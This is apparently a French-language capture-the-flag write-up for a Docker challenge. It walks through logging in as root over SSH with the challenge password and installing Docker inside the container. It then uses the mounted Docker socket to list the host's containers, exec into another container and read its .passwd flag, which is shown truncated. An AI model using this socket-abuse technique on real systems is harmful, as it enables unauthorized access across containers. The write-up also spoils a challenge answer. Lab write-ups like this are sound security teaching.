# Docker - Talk through me - Write-up

## Introduction 😎

Bienvenue dans le monde merveilleux de Docker, où tout semble sécurisé, mais où, parfois, un petit clic (ou une simple commande) suffit à tout faire exploser ! 💥 Vous êtes ici pour tester la sécurité du tout dernier conteneur d'un administrateur système un peu distrait. Bien sûr, après avoir vu ses containers déjà tout cassés, il espère que celui-ci sera mieux… mais qui suis-je pour dire non ? 😏

### Le Challenge 🎯

- Connectez-vous en SSH au conteneur Docker sur le port 2222 (login `root` et mot de passe `JL&g#4zNkQ&ztF8b`).
- Le mot de passe de validation du challenge se trouve dans le fichier `.passwd`.
- Le mot de passe de validation du CTF-ATD est dans `/passwd`.

## Étape 1 : Connexion au conteneur Docker 💻

Comme tout bon pirate qui se respecte, vous commencez par vous connecter en SSH au conteneur avec les informations généreusement partagées par l’administrateur (sans savoir à qui il a affaire 😜).

```bash
ssh root@<ip_du_conteneur> -p 2222
Mot de passe : JL&g#4zNkQ&ztF8b
```


## Étape 2 : Préparer le terrain (ou plutôt les outils) 🔧 

Un bon pirate ne part jamais sans ses outils ! Et ici, l’outil magique qui va faire toute la différence, c’est **Docker** . Mais pourquoi se contenter d’une installation sur l’hôte, quand vous pouvez installer **Docker directement dans le conteneur**  ? 🎩✨ Qui a dit que les conteneurs ne pouvaient pas avoir des pouvoirs ? 🤷‍♂️

Alors, pour ce faire, utilisez les commandes suivantes pour installer Docker dans le conteneur :



```bash
apt-get update
apt-get install docker.io -y
```

Et voilà, vous avez maintenant votre propre **Docker**  dans le conteneur ! 🎮

Maintenant, vous pouvez manipuler Docker à votre guise depuis ce conteneur, comme un vrai chef ! 🦸‍♂️ Pas mal, non ? 😎



---



## Étape 3 : Exploiter la socket Docker 🐳 

Alors, pourquoi installer Docker dans le conteneur, me direz-vous ? Eh bien, c’est parce que **la socket Docker**  est déjà montée dans ce conteneur ! 🎉 Cela signifie qu’on peut interagir avec l’hôte Docker à partir de ce conteneur, comme si c'était une porte secrète cachée dans les recoins de votre système. Un peu comme **Harry Potter**  avec sa baguette magique, mais version Docker ! 🪄

Maintenant que Docker est installé, vérifiez les conteneurs en cours d'exécution sur l'hôte avec la commande suivante :



```bash
docker container ls
```


### Résultat attendu 🧐 : 



```bash
CONTAINER ID   IMAGE            COMMAND                  CREATED          STATUS          PORTS     NAMES
1ca803b2871d   docker_flag      "/bin/sh"                12 minutes ago   Up 12 minutes             docker_flag
76b79677e3cc   docker_escape2   "/bin/sh -c '/etc/in…"   5 months ago     Up 12 minutes             escape2
```

Félicitations ! Vous avez réussi à **déverrouiller la porte secrète**  et à accéder à la liste des conteneurs en cours d'exécution sur l'hôte. Et regardez ! Il y a **docker_flag** , un conteneur qui semble être exactement ce que vous cherchez... Un peu trop beau pour être vrai, non ? 🤔


---



## Étape 4 : Récupérer le flag 🎁 

Maintenant, la mission est claire : **récupérer le flag**  ! Pour ce faire, vous devez ouvrir un shell dans le conteneur `docker_flag`, qui a un nom assez suspect pour ne pas éveiller vos soupçons… 🚨

Utilisez cette commande pour entrer dans le conteneur :



```bash
docker exec -it docker_flag /bin/sh
```


Une fois à l’intérieur du shell, il ne vous reste plus qu'à fouiller un peu pour trouver le fichier qui cache le mot de passe. Vous le sentez venir, non ? 🔍



```bash
cat /opt/notes/.passwd
```


### Résultat final 🏁 : 



```bash
You got Me ! This is the flag : f4f17...
```

**Bingo**  ! Vous avez trouvé le flag ! 🏆 Vous êtes un vrai pirate de Docker ! Arrêtez-vous un instant, vous l’avez bien mérité. 😎


---



## Conclusion 🎉 

Mission accomplie ! Grâce à l’installation de Docker dans le conteneur et à l'exploitation de la socket Docker montée, vous avez récupéré le flag. Une fois de plus, ce challenge prouve que même un **conteneur**  qui semble sécurisé peut cacher de belles failles… et vous pouvez très facilement les exploiter si vous avez l’œil aiguisé ! 👀
Alors, la prochaine fois que vous aurez un conteneur devant vous, rappelez-vous : un **root**  ou un **petit container** , peu importe, **tous les chemins mènent au flag**  si vous êtes assez rusé. 🏴‍☠️
*Et surtout, n’oubliez pas : vérifiez toujours vos portes et vos fenêtres, on ne sait jamais qui pourrait entrer… 😉*
